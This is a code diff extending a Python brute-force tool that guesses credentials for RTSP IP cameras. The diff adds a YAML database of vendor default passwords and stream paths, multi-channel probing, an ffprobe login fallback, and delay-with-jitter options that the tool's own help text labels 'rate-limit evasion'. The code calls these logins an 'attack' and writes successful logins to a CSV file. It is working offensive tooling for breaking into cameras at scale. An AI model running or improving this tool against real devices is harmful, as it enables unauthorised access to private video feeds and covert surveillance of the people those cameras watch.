@@ -57,6 +57,8 @@ import re
 import ssl
 import csv
 import socket
+import random
+import subprocess
 import threading
 from pickle import dump
 from hashlib import md5
@@ -67,7 +69,13 @@ from collections import namedtuple, defaultdict
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from optparse import OptionParser
 from colorama import Fore, Style
-from time import strftime, localtime, time
+from time import strftime, localtime, time, sleep
+
+try:
+    import yaml as _yaml  # type: ignore
+    _HAS_YAML = True
+except Exception:
+    _HAS_YAML = False
 
 # OpenCV is only needed for the optional frame capture on a successful login.
 # The core brute-force engine is native RTSP, so the tool still runs without it.
@@ -112,7 +120,8 @@ def display(status, data, start='', end='\n'):
 def get_arguments(*args):
     parser = OptionParser()
     for arg in args:
-        parser.add_option(arg[0], arg[1], dest=arg[2], help=arg[3])
+        flags = [f for f in (arg[0], arg[1]) if f]
+        parser.add_option(*flags, dest=arg[2], help=arg[3])
     return parser.parse_args()[0]
 
 lock = threading.Lock()
@@ -136,6 +145,15 @@ DEFAULT_CREDS_PATHS = [
 CAMERA_DB_PATHS = [
     SCRIPT_DIR / "data" / "cameras.csv",
 ]
+# YAML vendor knowledge base (banner signatures, vendor-specific paths and
+# credentials in one file). Loaded alongside the CSV DB; entries here augment
+# (not replace) the CSV data. Override with --vendor-db.
+VENDOR_YAML_PATHS = [
+    SCRIPT_DIR / "data" / "rtsp_vendors.yaml",
+]
+
+# Channels to try when expanding multi-channel RTSP path templates.
+MULTI_CHANNELS = [1, 2, 3, 4, 101, 102, 201, 202]
 
 # Substrings (lowercased) -> canonical vendor name. Matched against the RTSP/HTTP
 # `Server` header, the 401 `WWW-Authenticate` realm and the HTML `<title>`.
@@ -164,6 +182,8 @@ VENDOR_SIGNATURES = {
     "lorex": "Lorex",
     "swann": "Swann",
     "uniview": "Uniview",
+    "cp plus": "Cp Plus", "cpplus": "Cp Plus", "cp-plus": "Cp Plus",
+    "hifocus": "Hifocus",
 }
 
 # Last-resort RTSP paths tried when the vendor/model is unknown, or appended
@@ -371,6 +391,173 @@ def resolve_path(explicit, candidates):
 
 
 # --------------------------------------------------------------------------
+# YAML vendor knowledge base
+# --------------------------------------------------------------------------
+class VendorKB:
+    """Vendor-specific RTSP paths, credentials and banner signatures loaded
+    from a YAML knowledge base file (``data/rtsp_vendors.yaml``).
+
+    The YAML schema::
+
+        vendors:
+          - name: Hikvision
+            banners: ["Hikvision-Webs", "DVRDVS-Webs", "DNVRS-Webs"]
+            paths: ["/Streaming/Channels/101", "/h264/ch1/main/av_stream"]
+            creds:
+              - ["admin", "12345"]
+              - ["admin", ""]
+
+    ``banners`` are substrings matched (case-insensitive) against the raw RTSP
+    ``Server`` header, providing a second-chance identification for cameras
+    whose banner isn't in the hardcoded ``VENDOR_SIGNATURES``.
+    """
+
+    def __init__(self):
+        self._by_banner = []       # [(lowercase_substr, vendor_name), ...]
+        self._paths = defaultdict(list)   # vendor key -> [path, ...]
+        self._creds = defaultdict(list)   # vendor key -> [(user, pass), ...]
+        self.vendor_count = 0
+
+    @classmethod
+    def load(cls, yaml_path):
+        kb = cls()
+        if not yaml_path or not Path(yaml_path).exists():
+            return kb
+        if not _HAS_YAML:
+            return kb
+        try:
+            with open(yaml_path, encoding="utf-8") as f:
+                data = _yaml.safe_load(f)
+        except Exception:
+            return kb
+        if not isinstance(data, dict):
+            return kb
+        for entry in data.get("vendors", []):
+            name = (entry.get("name") or "").strip()
+            if not name:
+                continue
+            vk = normalize_key(name)
+            kb.vendor_count += 1
+            for b in entry.get("banners", []):
+                if b:
+                    kb._by_banner.append((b.lower(), name))
+            for p in entry.get("paths", []):
+                if p and p not in kb._paths[vk]:
+                    kb._paths[vk].append(p)
+            for c in entry.get("creds", []):
+                if isinstance(c, (list, tuple)) and len(c) >= 2:
+                    pair = (str(c[0]), str(c[1]))
+                    if pair not in kb._creds[vk]:
+                        kb._creds[vk].append(pair)
+        return kb
+
+    def identify_vendor(self, banner):
+        """Match a raw RTSP ``Server`` banner against the KB's banner list."""
+        if not banner:
+            return None
+        low = banner.lower()
+        for substr, name in self._by_banner:
+            if substr in low:
+                return name
+        return None
+
+    def paths_for(self, vendor):
+        return list(self._paths.get(normalize_key(vendor), []))
+
+    def creds_for(self, vendor):
+        return list(self._creds.get(normalize_key(vendor), []))
+
+
+# --------------------------------------------------------------------------
+# Multi-channel expansion
+# --------------------------------------------------------------------------
+_CHANNEL_PLACEHOLDER_RE = re.compile(r"\[CHANNEL\]|\{channel\}", re.I)
+_CHANNEL_PARAM_RE = re.compile(
+    r"(channel=|chID=|cam=|camera=|trackID=)(\d+)", re.I)
+
+
+def is_multichannel_path(path):
+    """True if the path contains a channel placeholder or a channel parameter."""
+    if _CHANNEL_PLACEHOLDER_RE.search(path):
+        return True
+    return bool(_CHANNEL_PARAM_RE.search(path))
+
+
+def expand_channels(path, channels=None):
+    """Expand a single path into one variant per channel.
+
+    Handles both ``[CHANNEL]``/``{channel}`` template placeholders and
+    concrete ``channel=N`` / ``chID=N`` / ``cam=N`` query parameters.
+    Returns a list of (expanded_path, channel_number) tuples. Paths without
+    a channel marker are returned as-is with channel 1.
+    """
+    if channels is None:
+        channels = MULTI_CHANNELS
+    # Template placeholder
+    if _CHANNEL_PLACEHOLDER_RE.search(path):
+        results = []
+        for ch in channels:
+            expanded = _CHANNEL_PLACEHOLDER_RE.sub(str(ch), path)
+            results.append((expanded, ch))
+        return results
+    # Concrete parameter (e.g. channel=1) — replace the number
+    m = _CHANNEL_PARAM_RE.search(path)
+    if m:
+        results = []
+        for ch in channels:
+            expanded = path[:m.start(2)] + str(ch) + path[m.end(2):]
+            results.append((expanded, ch))
+        return results
+    return [(path, 1)]
+
+
+# --------------------------------------------------------------------------
+# ffprobe fallback
+# --------------------------------------------------------------------------
+def ffprobe_check(url, timeout=6):
+    """Validate an RTSP URL via ``ffprobe`` (part of FFmpeg). Returns True if
+    the stream is reachable and at least one media track is found.
+
+    Unlike the cv2-based FFmpeg fallback, this needs no OpenCV and runs as a
+    lightweight subprocess. It is used as an extra validation step after a
+    native ``DESCRIBE`` success, and as a fallback login method for cameras
+    that the cv2 path can't reach (e.g. when OpenCV is not installed).
+    """
+    try:
+        result = subprocess.run(
+            ["ffprobe", "-v", "error", "-rtsp_transport", "tcp",
+             "-timeout", str(int(timeout * 1_000_000)),
+             "-i", url, "-show_entries", "stream=index"],
+            capture_output=True, timeout=timeout + 5)
+    except FileNotFoundError:
+        return False
+    except subprocess.TimeoutExpired:
+        return False
+    if result.returncode != 0:
+        stderr = result.stderr.decode("latin-1", "replace").lower()
+        if "401" in stderr or "unauthorized" in stderr:
+            return False
+        return False
+    stdout = result.stdout.decode("latin-1", "replace")
+    return "index=" in stdout
+
+
+def ffprobe_attempt(host, port, cred, tls=False, timeout=6):
+    """Try ONE credential via ffprobe. Returns a result dict on success."""
+    from urllib.parse import quote
+    user, password = cred
+    if user or password:
+        auth = f"{quote(user or '', safe='')}:{quote(password or '', safe='')}@"
+    else:
+        auth = ""
+    scheme = "rtsps" if tls else "rtsp"
+    url = f"{scheme}://{auth}{host}:{port}"
+    if ffprobe_check(url, timeout):
+        return {"user": user, "password": password, "url": url, "ffprobe": True}
+    return None
+
+
+# --------------------------------------------------------------------------
 # Target parsing / reachability
 # --------------------------------------------------------------------------
 def parse_target(target):
@@ -461,10 +648,16 @@ def _http_fingerprint(host, port, timeout):
 
 
 def _rtsp_fingerprint(host, port, timeout, tls=False):
-    """Return a vendor guess from the RTSP OPTIONS `Server` header (TLS-aware)."""
+    """Return ``(vendor, banner)`` from the RTSP OPTIONS ``Server`` header.
+
+    ``banner`` is the raw Server string (e.g. ``"Hikvision-Webs"``);
+    ``vendor`` is the canonical name matched via ``VENDOR_SIGNATURES`` (or
+    via the YAML knowledge-base banner list when the hardcoded dict misses).
+    Either may be None.
+    """
     sock = _open(host, port, timeout, tls)
     if sock is None:
-        return None
+        return None, None
     try:
         scheme = "rtsps" if tls else "rtsp"
         request = (f"OPTIONS {scheme}://{host}:{port} RTSP/1.0\r\n"
@@ -472,13 +665,15 @@ def _rtsp_fingerprint(host, port, timeout, tls=False):
         sock.sendall(request.encode())
         raw = sock.recv(2048).decode("latin-1", "replace")
     except OSError:
-        return None
+        return None, None
     finally:
         try:
             sock.close()
         except OSError:
             pass
-    return _match_signature(_header_value(raw, "Server"))
+    banner = _header_value(raw, "Server") or None
+    vendor = _match_signature(banner) if banner else None
+    return vendor, banner
 
 
 def _onvif_fingerprint(host, http_port, username, password, timeout):
@@ -576,19 +771,20 @@ def onvif_stream_routes(host, http_port, rtsp_port, creds, timeout):
 
 
 def fingerprint(host, http_port, rtsp_port, username, password, timeout, tls=False):
-    """Identify a camera's ``(vendor, model)`` best-signal-first.
+    """Identify a camera's ``(vendor, model, banner)`` best-signal-first.
 
-    ONVIF (vendor + model) -> HTTP headers (vendor) -> RTSP OPTIONS (vendor).
-    Model is only recoverable via ONVIF; without it the vendor-wide RTSP routes
-    still give broad coverage. The RTSP OPTIONS probe follows the target's TLS
-    setting; ONVIF/HTTP fingerprinting stays on the plain HTTP port.
+    ONVIF (vendor + model) -> HTTP headers (vendor) -> RTSP OPTIONS (vendor +
+    raw banner). The RTSP banner is always collected when the OPTIONS probe
+    runs (even if ONVIF/HTTP already found the vendor) and returned for
+    display and YAML-KB matching.
     """
     vendor, model = _onvif_fingerprint(host, http_port, username, password, timeout)
     if vendor is None:
         vendor = _http_fingerprint(host, http_port, timeout)
+    rtsp_vendor, banner = _rtsp_fingerprint(host, rtsp_port, timeout, tls)
     if vendor is None:
-        vendor = _rtsp_fingerprint(host, rtsp_port, timeout, tls)
-    return vendor, model
+        vendor = rtsp_vendor
+    return vendor, model, banner
 
 
 # --------------------------------------------------------------------------
@@ -892,10 +1088,10 @@ def capture_frame_from_url(url, host):
 # --------------------------------------------------------------------------
 # Per-host orchestration
 # --------------------------------------------------------------------------
-def ordered_credentials(vendor, base_combos, db, options):
-    """Per-host credential order: the fingerprinted vendor's default(s) first,
-    then the user-supplied combos, then (optionally) every scraped/common
-    default as a fallback."""
+def ordered_credentials(vendor, base_combos, db, vendor_kb, options):
+    """Per-host credential order: the fingerprinted vendor's default(s) first
+    (from both the CSV DB and the YAML KB), then the user-supplied combos,
+    then (optionally) every scraped/common default as a fallback."""
     ordered, seen = [], set()
 
     def add(username, password):
@@ -906,6 +1102,9 @@ def ordered_credentials(vendor, base_combos, db, options):
     if options["use_defaults"] and vendor:
         for username, password in db.default_creds_for(vendor):
             add(username, password)
+        if vendor_kb:
+            for username, password in vendor_kb.creds_for(vendor):
+                add(username, password)
     for username, password in base_combos:
         add(username, password)
     if options["all_defaults"]:
@@ -916,7 +1115,7 @@ def ordered_credentials(vendor, base_combos, db, options):
     return ordered
 
 
-def prepare_host(target, base_combos, db, options):
+def prepare_host(target, base_combos, db, vendor_kb, options):
     """Set one host up for the credential-outer attack WITHOUT trying any
     credential yet: reachability, fingerprint, the ordered route list (ONVIF
     exact path first) and the ordered credential list. Returns a state dict the
@@ -942,17 +1141,55 @@ def prepare_host(target, base_combos, db, options):
             with lock:
                 display('*', f"{target} => RTSPS (TLS) detected")
 
-    vendor, model = (None, None)
+    vendor, model, banner = (None, None, None)
     if options["fingerprint"]:
-        vendor, model = fingerprint(host, http_port, rtsp_port,
-                                    options["fp_user"], options["fp_pass"],
-                                    options["reach_timeout"] or 3.0, tls)
-        if options["verbose"] and (vendor or model):
+        vendor, model, banner = fingerprint(host, http_port, rtsp_port,
+                                            options["fp_user"], options["fp_pass"],
+                                            options["reach_timeout"] or 3.0, tls)
+        # Second-chance vendor ID via YAML KB banner list
+        if vendor is None and banner and vendor_kb:
+            vendor = vendor_kb.identify_vendor(banner)
+        if options["verbose"] and (vendor or model or banner):
+            tag = f"Vendor={vendor or '?'} Model={model or '?'}"
+            if banner:
+                tag += f" Banner={banner}"
             with lock:
-                display('*', f"{target} => Vendor={vendor or '?'} Model={model or '?'}")
+                display('*', f"{target} => {tag}")
 
     routes = db.rtsp_routes(vendor, model, rtsp_port, options["max_routes"])
-    creds = ordered_credentials(vendor, base_combos, db, options)
+
+    # Merge YAML KB vendor-specific paths into the route list
+    if vendor and vendor_kb:
+        kb_paths = vendor_kb.paths_for(vendor)
+        if kb_paths:
+            seen = {r for r in routes}
+            for p in kb_paths:
+                route = (p, rtsp_port)
+                if route not in seen:
+                    seen.add(route)
+                    routes.append(route)
+
+    # Multi-channel expansion: when enabled, expand channel-parameterized
+    # routes so the tool probes multiple channels per camera.
+    if options.get("multi_channel"):
+        expanded, seen = [], set()
+        for path, port in routes:
+            if is_multichannel_path(path):
+                for exp_path, _ch in expand_channels(path):
+                    key = (exp_path, port)
+                    if key not in seen:
+                        seen.add(key)
+                        expanded.append(key)
+            else:
+                key = (path, port)
+                if key not in seen:
+                    seen.add(key)
+                    expanded.append(key)
+        routes = expanded
+        if options["max_routes"] and options["max_routes"] > 0:
+            routes = routes[:options["max_routes"]]
+
+    creds = ordered_credentials(vendor, base_combos, db, vendor_kb, options)
 
     # Ask the device itself (ONVIF GetStreamUri) for its exact stream path(s).
     # These are authoritative, so they go to the front of the route list and the
@@ -974,7 +1211,8 @@ def prepare_host(target, base_combos, db, options):
 
     return {"target": target, "status": "READY", "host": host, "rtsp_port": rtsp_port,
             "tls": tls, "routes": routes, "creds": creds,
-            "vendor": vendor or "", "model": model or ""}
+            "vendor": vendor or "", "model": model or "",
+            "banner": banner or ""}
 
 
 # --------------------------------------------------------------------------
@@ -1016,7 +1254,11 @@ if __name__ == "__main__":
                               ('-T', "--tls", "tls", "Force RTSP-over-TLS / RTSPS on or off for every target: True (force TLS), False (force plaintext). Default (unset) = auto-detect per host. Per-target TLS can also be set with an rtsps:// (or rtsp://) prefix, e.g. rtsps://host:9000."),
                               ('-v', "--verbose", "verbose", f"Dislay Additional Information (True/False, Default={verbose})"),
                               ('-c', "--capture", "capture", f"Capture Frame if Successful Login (True/False, Default={capture_frame})"),
-                              ('-w', "--write", "write", "Name of the CSV File for the Successfully Logged In IPs to be dumped (default=current data and time)"))
+                              ('-w', "--write", "write", "Name of the CSV File for the Successfully Logged In IPs to be dumped (default=current data and time)"),
+                              ('-V', "--vendor-db", "vendor_db", "Path to a YAML vendor knowledge base (default: bundled data/rtsp_vendors.yaml). Provides banner signatures, vendor-specific paths and credentials."),
+                              ('-M', "--multi-channel", "multi_channel", "Expand channel-parameterized RTSP paths to probe multiple channels per camera (True/False, Default=False)"),
+                              ('-e', "--delay", "delay", "Base delay in seconds between credential rounds (Default=0). Use with --jitter for rate-limit evasion."),
+                              ('-j', "--jitter", "jitter", "Random jitter added to --delay, in seconds (Default=0). Each round sleeps delay + uniform(0, jitter)."))
     if not arguments.write:
         arguments.write = f"{date.today()} {strftime('%H_%M_%S', localtime())}.csv"
     if not arguments.password:
@@ -1169,9 +1411,12 @@ if __name__ == "__main__":
         arguments.verbose = arguments.verbose != "False"
         fingerprint_enabled = arguments.fingerprint != "False"
         all_defaults_enabled = arguments.all_defaults == "True"
+        multi_channel_enabled = arguments.multi_channel == "True"
         reach_timeout = float(arguments.reach_timeout) if arguments.reach_timeout is not None else 2.0
         rtsp_timeout = float(arguments.rtsp_timeout) if arguments.rtsp_timeout is not None else 6.0
         max_routes = int(arguments.max_routes) if arguments.max_routes is not None else 25
+        attack_delay = float(arguments.delay) if arguments.delay is not None else 0.0
+        attack_jitter = float(arguments.jitter) if arguments.jitter is not None else 0.0
         # Tri-state: True (force TLS), False (force plaintext), None (auto-detect).
         tls_option = True if arguments.tls == "True" else (
             False if arguments.tls == "False" else None)
@@ -1196,6 +1441,14 @@ if __name__ == "__main__":
         elif fingerprint_enabled or all_defaults_enabled:
             display('*', f"No default-credentials list found (looked for bundled data/default_credentials.csv). Vendor defaults disabled.")
 
+        # Load the YAML vendor knowledge base (banner sigs, paths, creds).
+        vendor_db_path = resolve_path(getattr(arguments, "vendor_db", None), VENDOR_YAML_PATHS)
+        vendor_kb = VendorKB.load(vendor_db_path)
+        if vendor_db_path and vendor_kb.vendor_count:
+            display('+', f"Loaded {vendor_kb.vendor_count} vendor(s) from YAML KB {vendor_db_path}")
+        elif not _HAS_YAML and vendor_db_path:
+            display('*', f"PyYAML not installed — YAML vendor KB skipped (pip install pyyaml)")
+
         # Cartesian user x password combos supplied on the command line.
         base_combos = []
         for user in arguments.user:
@@ -1206,11 +1459,14 @@ if __name__ == "__main__":
         options = {
             "verbose": arguments.verbose,
             "fingerprint": fingerprint_enabled,
-            "use_defaults": db.vendor_count > 0,
+            "use_defaults": db.vendor_count > 0 or vendor_kb.vendor_count > 0,
             "all_defaults": all_defaults_enabled,
+            "multi_channel": multi_channel_enabled,
             "reach_timeout": reach_timeout,
             "rtsp_timeout": rtsp_timeout,
             "max_routes": max_routes,
+            "delay": attack_delay,
+            "jitter": attack_jitter,
             "http_port": http_port_override,
             "tls": tls_option,
             "fp_user": arguments.user[0] if arguments.user else "",
@@ -1221,6 +1477,10 @@ if __name__ == "__main__":
         display(':', f"Total Number of IP Addresses = {total_ips}")
         display(':', f"Base Credential Combinations  = {len(base_combos)}")
         display(':', f"Fingerprinting = {fingerprint_enabled}, Vendor Defaults = {options['use_defaults']}, All Defaults Fallback = {options['all_defaults']}, Max Routes = {max_routes}")
+        if multi_channel_enabled:
+            display(':', f"Multi-channel expansion = ON (channels {MULTI_CHANNELS})")
+        if attack_delay > 0 or attack_jitter > 0:
+            display(':', f"Attack interval = {attack_delay:.1f}s delay + {attack_jitter:.1f}s jitter")
         display(':', f"Starting {threads_number} Threads", start='\n')
 
         successful_logins = []
@@ -1258,6 +1518,8 @@ if __name__ == "__main__":
                 note, method = " (no auth)", "no-auth"
             elif result.get("no_route"):
                 note, method = " (auth ok, stream path unknown)", "no-route"
+            elif result.get("ffprobe"):
+                note, method = " (via ffprobe, route removed)", "ffprobe"
             elif result.get("ffmpeg"):
                 note, method = " (via ffmpeg, route removed)", "ffmpeg"
             with lock:
@@ -1283,6 +1545,11 @@ if __name__ == "__main__":
                 batch = [st for st in remaining if i < len(st["creds"])]
                 if not batch:
                     continue
+                # Configurable inter-round delay with jitter for rate-limit evasion
+                if i > 0 and (attack_delay > 0 or attack_jitter > 0):
+                    pause = attack_delay + random.uniform(0, attack_jitter)
+                    if pause > 0:
+                        sleep(pause)
                 for state, result in run_batch(
                         batch, lambda st: attempt_fn(st, st["creds"][i]),
                         f"{label} cred {i + 1}/{total_rounds}"):
@@ -1295,7 +1562,7 @@ if __name__ == "__main__":
         # Phase 1 — prepare every host ONCE (reachability, fingerprint, routes,
         # credentials). No per-host credential attempts here, so no burst.
         prepared = [st for _, st in run_batch(
-            ips, lambda ip: prepare_host(ip, base_combos, db, options), "Fingerprinting")]
+            ips, lambda ip: prepare_host(ip, base_combos, db, vendor_kb, options), "Fingerprinting")]
         ready = [st for st in prepared if st["status"] == "READY"]
         unreachable = sum(1 for st in prepared if st["status"] == "UNREACHABLE")
 
@@ -1314,8 +1581,16 @@ if __name__ == "__main__":
                                             options["rtsp_timeout"], st["tls"]),
             "Brute")
 
-        # Phase 3 — FFmpeg route-removed fallback (original tool's method), also
-        # credential-outer, for hosts the native engine couldn't crack.
+        # Phase 3 — ffprobe route-removed fallback (lightweight, no OpenCV
+        # needed), credential-outer, for hosts the native engine couldn't crack.
+        credential_rounds(
+            ready,
+            lambda st, cred: ffprobe_attempt(st["host"], st["rtsp_port"], cred,
+                                             st["tls"], options["rtsp_timeout"]),
+            "ffprobe")
+
+        # Phase 4 — FFmpeg/cv2 route-removed fallback (original tool's method),
+        # also credential-outer, for hosts neither native nor ffprobe cracked.
         if _HAS_CV2:
             credential_rounds(
                 ready,
